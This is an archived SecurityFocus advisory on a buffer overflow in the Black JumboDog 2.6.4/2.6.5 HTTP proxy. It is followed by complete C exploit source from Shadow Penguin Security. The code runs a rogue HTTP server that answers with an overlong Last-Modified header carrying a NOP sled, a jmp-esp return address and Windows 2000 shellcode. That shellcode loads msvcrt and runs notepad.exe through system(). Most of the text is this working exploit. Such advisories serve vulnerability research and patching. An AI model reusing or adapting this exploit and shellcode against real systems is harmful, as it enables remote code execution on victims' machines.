source: http://www.securityfocus.com/bid/3858/info

Black JumboDog 2.6.4 and 2.6.5 HTTP proxy is vulnerable to an exploitable buffer overflow. The buffer overflow can be exploited by sending excessively long "expires", "if-modified-since", and "Last_Modified" strings containing executable code. A client must be able to use the Black JumboDog HTTP proxy function. Black JumboDog also has mail proxy functions and this buffer overflow can be exploited with HTML mail. This is a japanese software product.

/*=========================================================================
   Black JumboDog 2.6.4/2.6.5 Exploit for Windows 2000(J) Professional
   The Shadow Penguin Security (http://www.shadowpenguin.org)
   Written by UNYUN (unyun@shadowpenguin.org)
  =========================================================================
*/
#include <unistd.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <stdio.h>
#include <stdlib.h>

#define RESP \
"HTTP/1.1 200 OK\r\n"\
"Date: Sat, 1 Jan 2002 00:00:00 GMT\r\n"\
"Server: Apache/1.3.17 (Unix)\r\n"\
"Last-Modified: %s\r\n"

#define SERVICE_PORT        8888
#define MAXBUF              3000
#define NOP                 0x90
#define RETADR              1076
#define CODEOFS             1100
#define JMPESP_ADR          0x77e0af64
#define OFS_LoadLibrary     18
#define OFS_GetProcAddress  30
#define ADDR_LoadLibrary    0x77e5a254  
#define ADDR_GetProcAddress 0x77e59ac1

static unsigned char egg[512]={
    0xEB,0x2A,0x5B,0x33,0xC9,0x4B,0x88,0x4B,
    0x0B,0x43,0x88,0x4B,0x11,0x88,0x4B,0x1D,
    0x53,0xB8,0x73,0x72,0xE5,0x77,0xFF,0xD0,
    0x83,0xC3,0x0B,0x53,0x50,0xB8,0x31,0x70,
    0xE5,0x77,0xFF,0xD0,0x83,0xC3,0x07,0x53,
    0xFF,0xD0,0xEB,0xFE,0xE8,0xD1,0xFF,0xFF,
    0xFF,0x6D,0x73,0x76,0x63,0x72,0x74,0x2E,
    0x64,0x6C,0x6C,0x2E,0x73,0x79,0x73,0x74,
    0x65,0x6D,0x2E,0x6E,0x6F,0x74,0x65,0x70,
    0x61,0x64,0x2E,0x65,0x78,0x65,0x2E,0x00
};

void valset(char *buf,unsigned int val)
{
    *buf=val&0xff;
    *(buf+1)=(val>>8)&0xff;
    *(buf+2)=(val>>16)&0xff;
    *(buf+3)=(val>>24)&0xff;
}

main()
{
    FILE                *fp;
    static char         buf[MAXBUF];
    static char         pkt[MAXBUF*2];
    char                tmp[512];
    int                 sock,sock_accept;
    int                 optval;
    struct sockaddr_in  addr;

    memset(buf,NOP,MAXBUF);
    valset(buf+RETADR,JMPESP_ADR);
    valset(egg+OFS_LoadLibrary,ADDR_LoadLibrary);
    valset(egg+OFS_GetProcAddress,ADDR_GetProcAddress);
    strncpy(buf+CODEOFS,egg,strlen(egg));
    buf[MAXBUF-1]=0;
    sprintf(pkt,RESP,buf);

    if ((sock=socket(AF_INET,SOCK_STREAM,0))==-1){
        perror("socket");
        exit(1);
    }

    optval=1;
    setsockopt(sock,SOL_SOCKET,SO_REUSEADDR,(void *)&optval,sizeof(optval));
    addr.sin_family      = AF_INET;
    addr.sin_port        = htons(SERVICE_PORT); 
    addr.sin_addr.s_addr = INADDR_ANY;
    if ((bind(sock,(struct sockaddr *)&addr,sizeof(addr)))==-1){
        perror("bind");
        close(sock);
        exit(1);
    }
    if (listen(sock,1)==-1){
        perror("listen");
        close(sock);
        exit(1);
    }
    for (;;){
        if ((sock_accept=accept(sock,NULL,NULL))==-1){
            perror("accept");
            close(sock);
            exit(1);
        }
        if (recv(sock_accept,tmp,sizeof(tmp),0)<=0){
            close(sock_accept);
            continue;
        }
        send(sock_accept,pkt,strlen(pkt),0);
        close(sock_accept);
    }
}

